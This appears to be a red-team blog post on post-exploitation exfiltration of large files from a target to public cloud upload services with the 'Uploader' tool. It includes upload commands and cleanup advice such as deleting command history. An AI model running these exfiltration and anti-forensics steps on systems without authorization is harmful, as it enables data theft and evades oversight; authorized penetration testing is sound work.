---
title: "Large File Transfer over C2: Separating the Data Channel with Cloud Uploads"
date: 2026-07-16T23:16:00+08:00
draft: false
description: "Move large-file traffic off the C2 control channel and use Uploader for backend probing, size preflight, packing, encryption, and failover."
categories: ["security"]
tags: ["red-team", "c2", "post-exploitation", "uploader", "file-transfer"]
featuredImage: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
featuredImagePreview: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
lightgallery: true
toc:
  enable: true
  auto: true
---

C2 is designed for command control and lightweight interaction, not sustained large-file transfers. During authorized testing, bulk traffic can be moved to a temporary cloud upload service while C2 only sends commands and returns download links.

<!--more-->

{{< admonition warning "Disclaimer" >}}
For authorized penetration testing and research only. Do not use this against systems you do not have permission to test.
{{< /admonition >}}

## 1. Why separate the data channel

Directly downloading large files over C2 creates four problems:

- **Bandwidth contention**: bulk transfers block command interaction and heartbeats.
- **Reliability**: sleep, jitter, timeouts, and weak resume support increase retransmission cost.
- **Path overhead**: encoding, chunking, pivots, SOCKS, and multiple hops add traffic, latency, and failure points.
- **Infrastructure exposure**: sustained high-volume traffic converges on the C2 server and affects other sessions on a shared Team Server.

The separated flow is:

1. Stage files or directories on the target
2. Upload from the target to a temporary storage service reachable from the current network
3. Return the download link over C2
4. Download the file from a separate testing environment

Control traffic stays on C2; large-file traffic follows target → upload service.

## 2. How Uploader handles the transfer

[Uploader](https://github.com/simonlee-hello/uploader) implements the multi-backend approach introduced by [Mikubill/transfer](https://github.com/Mikubill/transfer). Its main functions are:

- `backends`: list backends, size limits, status, and URLs.
- `probe`: test reachability and latency from the current network.
- Automatic mode: filter backends by payload size, probe and sort by latency, then fail over on errors.
- Size preflight: reject a file or estimated directory size that exceeds a backend limit.
- Directory handling: create a temporary Deflate ZIP by default and remove it after upload; `-r` uploads files individually.
- Encryption: `-e -k` uses AES-256-CBC with a `UP01` header, random IV, and ciphertext.
- Script-friendly output: `-q` writes only the successful link to stdout and errors to stderr.

Backend availability changes with both the service and the network. Treat `uploader probe` as the runtime source of truth.

## 3. Command examples

{{< image src="/images/posts/c2-large-file-exfil-via-cloud-upload/uploader-demo.gif" caption="Uploader demo: backends / probe / upload / quiet mode / encrypt" >}}

```bash
uploader -q ./evidence
```

Without `-b`, the sequence is: size filter → probe → latency order → failover. Directories are packed first; success prints one download link.

```bash
# Pin lit
uploader -q -b lit ./dump.zip

# Prefer lit but allow failover
uploader -q -b lit -auto ./dump.zip

# Upload directory files individually
uploader -q -r ./dir

# Encrypt before upload
uploader -q -e -k 'your-key' ./secret.bin
```

List and probe backends:

```bash
uploader backends
uploader probe
uploader probe temp lit gof -timeout 20
```

Exit codes are `0` for success, `1` for upload or configuration failure, and `2` for invalid arguments. `-keep` waits for keyboard input and is unsuitable for headless execution.

## 4. Limitations and checks

1. Confirm target egress, proxy, allowlists, and TLS inspection policy, then validate the path with a small file.
2. Public upload services may log sources, scan content, and enforce file-type, capacity, and retention limits. Confirm engagement requirements before use.
3. Directory mode writes a temporary ZIP to disk. Use `-r` or another transfer method if staging is not allowed.
4. AES-256-CBC provides content confidentiality only; it does not replace integrity verification or key management.
5. Filenames can disclose context. Use names without business meaning.
6. After download, remove temporary files, the binary, and command history, and retrieve data before the link expires.
